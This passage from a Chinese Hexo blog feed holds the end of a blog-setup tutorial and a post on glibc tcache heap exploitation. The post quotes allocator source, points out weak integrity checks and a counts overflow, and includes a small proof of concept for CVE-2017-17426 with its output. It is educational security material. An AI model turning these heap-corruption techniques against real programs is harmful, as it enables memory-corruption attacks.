href="https://blog.csdn.net/qq_42893625/article/details/100852221">这个文章中</a>给出了解决的办法，第一种是重装node.js，这次要安装到默认路径，另一种在power shell运行命令</p></blockquote><p>安装完成后，输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init //初始化</span><br><span class="line">hexo g    //静态部署</span><br><span class="line">hexo s    //运行，ctrl + c退出运行</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338885.png" alt="image-20231120233514011"></p><p>接下来，将Hexo部署到github，在_config.yml文件的底部，使用以下代码将原来的deploy替换掉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/yourname/yourname.github.io.git #仓库地址</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>仓库地址：点击右上角头像-Your repositories-选择刚才创建的仓库-Code-HTTPS-复制后面的地址</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338061.png" alt="image-20231120234110924"></p><p>回到blog文件夹，输入命令部署插件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338104.png" alt="image-20231120234352934"></p><p>然后是hexo三部曲</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean   #清除缓存文件 db.json 和已生成的静态文件 public</span><br><span class="line">hexo g       #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写)</span><br><span class="line">hexo d       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338155.png" alt="image-20231120234526332"></p><p>命令正常运行的话，打开浏览器，输入 <a href="https://yourname.github.io/">https://yourname.github.io</a> 就可以打开你的网页了。</p><p><strong>这里有一个要注意的地方，如果之前使用过域名解析，那么需要清理DNS缓存，否则会跳转之前解析的域名，如果域名没在使用就会报错。</strong></p><p>至此基础的步骤已经做完了，其余的其实是对主题和页面的美化以及域名解析等等。</p><h2 id="主题美化"><a href="#主题美化" class="headerlink" title="主题美化"></a>主题美化</h2><h3 id="搭建主题"><a href="#搭建主题" class="headerlink" title="搭建主题"></a>搭建主题</h3><p>主题有很多，可以自己选择，我选择的是Butterfly主题，先安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338222.png" alt="image-20231121000245755"></p><p>安装pug和stylus渲染器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338231.png" alt="image-20231121000222011"></p><p>修改根目录下的_config.yml文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p>git输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>可以在<code>localhost:4000</code>查看修改后的页面，这样可以避免每次都使用hexo三部曲，毕竟很费时间。</p><p>美化找文章改改配置文件就行，大同小异。</p><h2 id="博客上传"><a href="#博客上传" class="headerlink" title="博客上传"></a>博客上传</h2><h3 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h3><p>参考：<a href="https://blog.csdn.net/muxuen/article/details/122441469">Typora+PicGo+阿里云OSS搭建博客图床（超详细）-CSDN博客</a></p><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;Blog Name&quot;</span><br></pre></td></tr></table></figure><p>在<code>source/_posts</code>找到对应文章修改。</p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>建议阿里云，购买后阿里云控制台添加域名解析</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312230000860.png" alt="image-20231223000045666"></p><p>在source文件夹新建文件命名为CANME（无后缀），输入买的域名，然后执行hexo的三个命令即可。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客（超详细） - 知乎 (zhihu.com)</a></p></li><li><p><a href="https://www.cnblogs.com/MoYu-zc/p/14395965.html">Butterfly美化 - MoYu-zc - 博客园 (cnblogs.com)</a></p></li><li><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">【Hexo】Hexo搭建Butterfly主题并快速美化_hexo主题-CSDN博客</a></p></li><li><p><a href="https://blog.csdn.net/muxuen/article/details/122441469">Typora+PicGo+阿里云OSS搭建博客图床（超详细）-CSDN博客</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap Exploitation-tcache</title>
      <link href="/article/b53c.html"/>
      <url>/article/b53c.html</url>
      
        <content type="html"><![CDATA[<h1 id="Heap-Exploitation-tcache"><a href="#Heap-Exploitation-tcache" class="headerlink" title="Heap Exploitation - tcache"></a>Heap Exploitation - tcache</h1><p>tcache是glibc2.26（ubuntu17.10）之后引入的一种技术，目的是堆管理的性能，在检测机制上有些变化，也新增了一些利用方式。</p><p>TCache全名为Thread Local Caching，它会为每个线程创建一个缓存，里面包含一些小堆块，无需对arena上锁即可使用，提升了分配性能。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>glibc在编译时使用USE_TCACHE条件开启tcache机制，默认开启</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS        64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk。在64位系统上以16字节递增，从24到1032字节。32位系统上以8字节递增，从12到512字节。tcache bin只用于存放非large的chunk。</p><p>tcache引入了两个新的结构体，tcache_entry和tcache_perthread_struct</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>tcache_perthread_struct位于堆开头的位置，说明其本身也是一个堆块，大小为0x250。它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 。</p><p>tcache_entry其中包括数组entries用于放置64个bin的地址，数组counts则存放每个bin中的chunk数量，每个被放入bins的chunk都会在其用户数据中包含一个tcache_entry（即fd指针），链接了相同大小的空闲的下一个chunk的用户数据，类似于fast bins，从而构成单链表。需要注意的是这里的 next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p><h2 id="初始化操作"><a href="#初始化操作" class="headerlink" title="初始化操作"></a>初始化操作</h2><p>在_int_malloc中，第一次malloc时会进入到MAYBE_INIT_TCACHE ()，其中 MAYBE_INIT_TCACHE () 在 tcache 为空（即第一次 malloc）时调用了 <code>tcache_init()</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span></span><br><span class="line"><span class="meta">    tcache_init();</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br></pre></td></tr></table></figure><p>初始化操作如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);<span class="comment">//获得malloc需要的字节数</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);<span class="comment">//使用malloc为该结构分配内存</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;<span class="comment">//存放</span></span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));<span class="comment">//清零</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tcache的tcache_perthread_struct结构是由_int_malloc来分配并通过memset清零来进行初始化的。tcache_init()成功返回后，tcache_perthread_struct 就被成功建立了。</p><h2 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h2><h3 id="向tcache放入chunk"><a href="#向tcache放入chunk" class="headerlink" title="向tcache放入chunk"></a>向tcache放入chunk</h3><p>_libc_free中并没有变化，int_free中有一些修改，在fastbin的操作之前执行，当大小符合要求，即为non-large chunk并且对应的bin还未满7个就调用tcache_put将该块放入tcache</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><p>调用_int_malloc时，有三处会触发将chunk放入tcache的操作</p><ul><li><p>fast bin中返回了一个chunk，对应的fast bin中的其他chunk会被放进对应的tcache bin中，直到满或者fast bin中为空为止。需要注意的是，chunks在tcache bin中和fast bins中的顺序相反</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (pp = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>small bins中的情况和fast bins中类似，双链表中的剩余chunk会被填充到tcache bin中，直到small bins空或者tcache bin满为止</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></li><li><p>在unsorted bin中，当用户所需的chunk大小与unsorted chunk一致，那么首先会将该chunk放入对应的tcache中并跳过该次循环，对于unsorted bin而言，与用户需求大小相等的块会被优先放入tcache中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></li></ul><h3 id="从tcache取出chunk"><a href="#从tcache取出chunk" class="headerlink" title="从tcache取出chunk"></a>从tcache取出chunk</h3><p>在_int_malloc之前，当用户需要的chunk大小不为large并且tcache已经完成初始化，并且tcache中有相应的chunk块，调用tcache_get()从tcache取出chunk。注意取出chunk是在fast bins之前，也就是说，tcache是最高一级的缓存措施。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在binning code中，如果在tcache中放入的chunk到了上限就会直接返回最后一个chunk，默认情况下是没有限制的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>bining code结束后，如果没有直接返回，那么如果至少有一个符合要求的chunk被找到，则返回最后一个。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>另外，tcache中的chunk不会被合并，prev_inuse始终不为0。</p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>函数tcahce_put()和tcache_get()函数分别用于从单链表中放入和取出chunk。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从tcache中取出chunk的函数，几乎没有任何保护。</p><h3 id="tcahe-put"><a href="#tcahe-put" class="headerlink" title="tcahe_put()"></a>tcahe_put()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有将P位置零并且几乎没有任何保护。</p><p>通过以上可以看出这两个函数都假设调用者对参数进行了有效性检查，但是由于tcache的操作在free和malloc都处于很靠前的位置，所以很多的有效性检查没有起到作用，这样做有效地提升了效率，但是安全性降低，反而使得堆利用的方法更多了。</p><p>tcache_get()函数中，<code>assert (tcache-&gt;entries[tc_idx] &gt; 0);</code>此处本意是检查tcahce bin中chunk的数量是否大于0，但是<strong>counts可以发生整数溢出变成负数</strong>。<strong>该问题在glibc2.28得到修复。</strong></p><h3 id="CVE-2017-17426"><a href="#CVE-2017-17426" class="headerlink" title="CVE-2017-17426"></a>CVE-2017-17426</h3><p>libc-2.26的tcache机制发现了安全漏洞，由于_libc_malloc()使用了request2size()来将请求大小转换为实际大小，而该函数没有进行整数溢出检查。所以如果请求一个很大的堆块（接近SIZE_MAX），那么就会导致整数溢出，从而导致malloc错误地返回tcache bin中的堆块。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *x = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(10): %p\n&quot;</span>, x);</span><br><span class="line">    <span class="built_in">free</span>(x);</span><br><span class="line">    <span class="type">void</span> *y = <span class="built_in">malloc</span>(((<span class="type">size_t</span>)~<span class="number">0</span>) - <span class="number">2</span>); <span class="comment">// overflow allocation (size_t.max-2)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(((size_t)~0) - 2): %p\n&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc cve201717426.c</span><br><span class="line">$ /usr/local/glibc-2.26/lib/ld-2.26.so ./a.out</span><br><span class="line">malloc(10): 0x7f3f945ed260</span><br><span class="line">malloc(((size_t)~<span class="number">0</span>) - <span class="number">2</span>): <span class="number">0</span>x7f3f945ed260</span><br><span class="line">$ /usr/local/glibc-<span class="number">2.27</span>/lib/ld-<span class="number">2.27</span>.so ./a.out</span><br><span class="line">malloc(<span class="number">10</span>): <span class="number">0</span>x7f399c69e260</span><br><span class="line">malloc(((size_t)~<span class="number">0</span>) - <span class="number">2</span>): (nil)</span><br></pre></td></tr></table></figure><p>使用glibc2.26时，第二次malloc返回了第一次free的堆块，使用glibc2.27时，返回NULL，问题已经被修复。</p><p>修复方法，使用cecksed_request2size()函数替换request2size()函数，实现对整数溢出的检查</p><h3 id="二次释放检查"><a href="#二次释放检查" class="headerlink" title="二次释放检查"></a>二次释放检查</h3><p>libc-2.28增加了对tache中二次释放的检查，方法是在tcache_entry结构中增加一哥标志key，用于表示chunk是否已经在tcache bin中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">index <span class="number">6</span>d7a6a8..f730d7a <span class="number">100644</span> (file)</span><br><span class="line">--- a/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">+++ b/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">@@ <span class="number">-2967</span>,<span class="number">6</span> +<span class="number">2967</span>,<span class="number">8</span> @@ mremap_chunk (mchunkptr p, <span class="type">size_t</span> new_size)</span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">+  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">+  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line"> &#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)</span></span><br><span class="line"><span class="comment"> &#123;</span></span><br><span class="line"><span class="comment">   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span></span><br><span class="line"><span class="comment">   assert (tc_idx &lt; TCACHE_MAX_BINS);</span></span><br><span class="line"><span class="comment">+</span></span><br><span class="line"><span class="comment">+  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">+     detect a double free.  */</span></span><br><span class="line">+  e-&gt;key = tcache;</span><br><span class="line">+</span><br><span class="line">   e-&gt;next = 